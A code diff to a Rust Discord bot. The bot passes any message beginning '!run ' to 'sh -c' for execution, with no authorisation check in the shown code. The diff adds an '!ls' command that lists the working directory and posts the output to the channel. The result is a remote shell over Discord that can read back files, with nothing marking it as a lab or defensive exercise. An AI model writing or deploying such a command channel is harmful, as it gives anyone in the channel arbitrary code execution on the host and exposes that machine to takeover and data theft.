@@ -1,11 +1,11 @@
 use std::env;
 
+use serenity::all::GatewayIntents;
 use serenity::async_trait;
 use serenity::model::channel::Message;
 use serenity::model::gateway::Ready;
 use serenity::prelude::*;
 use tokio::process::Command;
-use serenity::all::GatewayIntents;
 
 struct Handler;
 
@@ -26,12 +26,28 @@ impl EventHandler for Handler {
         }
         if msg.content.starts_with("!run ") {
             let command = msg.content.strip_prefix("!run ").unwrap_or("");
-            if let Err(why) = Command::new("sh")
-                .arg("-c")
-                .arg(command)
-                .spawn()
-            {
+            if let Err(why) = Command::new("sh").arg("-c").arg(command).spawn() {
                 println!("Error executing command: {why:?}");
+            }
+        }
+        if msg.content == "!ls" {
+            let output = if cfg!(target_os = "windows") {
+                Command::new("cmd").args(["/C", "dir"]).output()
+            } else {
+                Command::new("ls").arg("-la").output()
+            };
+
+            match output.await {
+                Ok(output) => {
+                    let result = String::from_utf8_lossy(&output.stdout);
+                    let response = format!("```{}```", result);
+                    if let Err(why) = msg.channel_id.say(&ctx.http, response).await {
+                        println!("Error sending ls output: {why:?}");
+                    }
+                }
+                Err(why) => {
+                    println!("Error executing ls command: {why:?}");
+                }
             }
         }
     }
